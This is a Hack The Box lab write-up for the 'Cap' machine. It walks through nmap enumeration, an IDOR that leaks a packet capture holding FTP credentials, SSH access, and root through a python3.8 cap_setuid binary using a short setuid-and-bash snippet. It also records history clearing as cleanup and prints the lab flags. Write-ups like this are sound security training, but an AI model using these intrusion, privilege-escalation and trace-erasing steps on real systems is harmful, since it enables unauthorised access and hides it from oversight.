# HTB: Cap

**OS:** Ubuntu 20.04.2  
**Difficulty:** Easy  
**Date:** 2025-07-21  
**Box IP:** 10.10.10.245  
**Local IP:** 10.10.14.16  

---

## Engagement Overview

**Objectives:**

- Discover and exploit an IDOR (Insecure Direct Object Reference)
- Extract credentials from exposed packet capture
- Escalate privileges to root via Linux capabilities

---

## Service Enumeration

### Nmap - Full TCP Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.245
```
**Result:**
- Port 21 – FTP (vsftpd 3.0.3)
- Port 22 – SSH (OpenSSH 8.2p1)
- Port 80 – HTTP (Gunicorn, Python-based web server)

### Nmap - Service Enumeration
```bash
nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.245
```

Key Observations:
- Gunicorn dashboard exposed on HTTP port
- No anonymous FTP access
- SSH accessible with potential brute-force vector if creds are found

### Nmap - Vulnerability Scan
```bash
nmap --script vuln -oN scans/vuln.txt 10.10.10.245
```

Findings:
- Possible CSRF forms on `/`, `/data/1`, `/ip`
- Slowloris DoS (CVE-2007-6750) likely vulnerable (not exploited)

---

## Initial Access – IDOR Exploitation

**Discovery:**
The web app exposes capture downloads via predictable `/data/<id>` URLs.

Browsing to `/data/0` revealed a capture not generated by the current session — classic IDOR vulnerability.

**Credential Extraction:**
Downloaded capture analyzed in Wireshark revealed cleartext FTP credentials:

```
USER: nathan
PASS: Buck3tH4TF0RM3!
```

---

## Foothold

### FTP Access
```bash
ftp 10.10.10.245
# Login successful with leaked credentials
```

Enumerated home directory and retrieved `user.txt`:
```bash
ftp> get user.txt
e64084b4cf1836347593df12f6a16b75
```

### SSH Access
Logged in successfully as `nathan` using same credentials.

---

## Privilege Escalation

### LinPEAS Findings
```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Linux capabilities allow `python3.8` to run with `cap_setuid` — letting it change UID without setuid bit. This means we can invoke root shell with Python directly.

### Exploit
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Successfully escalated to root. Retrieved `root.txt`:
```
f0f8a2a1d4bfdea7688e471cf3ad04a4
```

---

## Post-Exploitation

### Cleanup
- Removed `linpeas.sh`
- Cleared `.bash_history`

### Credentials & Flags
- `user.txt`: `e64084b4cf1836347593df12f6a16b75`  
- `root.txt`: `f0f8a2a1d4bfdea7688e471cf3ad04a4`  

---

## Tools Utilized
- `nmap`, `ssh`, `ftp`, `python3`
- Wireshark
- LinPEAS

---

## Key Takeaways

**Skills Required:**
- Web enumeration
- Packet analysis

**Skills Learned:**
- Insecure Direct Object Reference (IDOR)
- Exploiting Linux capabilities for privilege escalation
